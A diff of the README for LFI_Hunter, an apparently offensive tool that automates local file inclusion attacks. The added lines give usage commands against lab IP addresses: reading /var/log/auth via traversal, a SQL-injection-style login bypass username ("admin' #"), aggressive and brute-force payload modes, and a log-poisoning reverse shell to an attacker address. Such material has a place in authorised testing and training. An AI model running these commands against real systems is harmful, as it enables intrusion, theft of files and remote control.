@@ -3,13 +3,12 @@
 ##  what is LFT_Hunter ?
 * LFT_Hunter tool heve To atoumation file inclusion attack 
 * read file and get the file in your local machine
-* bypass the php sintezwer
 * filter php base64 and auto decoded the data
 * auto Injaction log file and get reverseshell "if can read log file"
 * work with authentication login
 * support not authentication as well 
 #### LFI_Hunter modes 
-   - Agressive mode 
+   - Aggressive mode 
    - Burte Fource mode
    - read file mode
 ##  what is file inclusion vulnerability ?
@@ -71,11 +70,43 @@ options:
   -S SHELL, --shell SHELL
                         to connent reverseshell
 ```
-  
+-------------------------------------------------------------------------------------------------
+### Command read mode :-
+
+```
+./LFI_Hunter.py  -C cookie -UV http://192.168.56.115/sea.php?file=  --auth -LU http://192.168.56.115/atlantis.php --user "admin' #" --password password  --read /var/log/auth -S 192.168.56.1 -UF username -PF password
+```
+ *  < -C / --cookies >   cookie file' add the cookie in to file and give the LFI_Hunter the path of the cookie file\
+ *  < -VU / --Vulnurl >  the url of the file url "http://web.com/file="
+ *  < --auth >           login the web from terminal
+ *  < -LU / --loginurl>  add login url 
+ *  < -U / --user >      add user name
+ *  < -P / --password >  add the password 
+ *  < -R / --read >      add the name of the to read from the website true the directory traversal 
+ *  < -S / --shell >     connect auto reverse shell " if can read log files same like "/var/log/auth.log or /proc/sealf/envertion"
+ *  < -UF / --USERFORM > if the field of username have different name so to can past in username give the field name after -UF 
+ *  < -PF/ --PASSFORM  > if the field of password have different name so to can past in password give the fieldname after -PF
+------------------------------------------------------------
+### Command Agreesiv mode  :-
+```
+./LFI_Hunter.py  -C cookie -UV http://192.168.56.115/sea.php?file=  --auth -LU http://192.168.56.115/atlantis.php --user "admin' #" --password password  -A
+```
+*  < -A / --aggress>  to user aggressive mode "for this mode LFI_Hunter use some of payload and comparison between length  response come from web site
+the big length mine have date we want read it '
+### Command brute force mode  :-
+```
+./LFI_Hunter.py  -C cookie -UV http://192.168.56.115/sea.php?file=  --auth -LU http://192.168.56.115/atlantis.php --user "admin' #" --password password
+```
+* brute force mode try payload untill can read file if can read it LFI_Hunter will break and give you information about the file
+
+### Notes :
+* all mode can run with authentication or not authentication as per your situation
+* Cookies is requride 
+* < -F / --filelist > LFI_Hunter have default wordlist to use for Brute force if you try your own list give -F and the path of your list
+* < -B /--baes64 > To use php filtter decode64 'LFI_Hunter will decode the data to asscii auto 
 
 ### ScreenShot
- <img src = "images/2.gif" width=400> <img src = "images/7.gif" width=400>  <img src = "images/3.png" width=400> 
-  
-### [for Connect]
-* administrator@jacstory.tech
+ <img src = "images/2.gif" width=400> <img src = "images/7.gif" width=400>  
+### Connect
+* jac11devel@gmail.com
 * thank you 
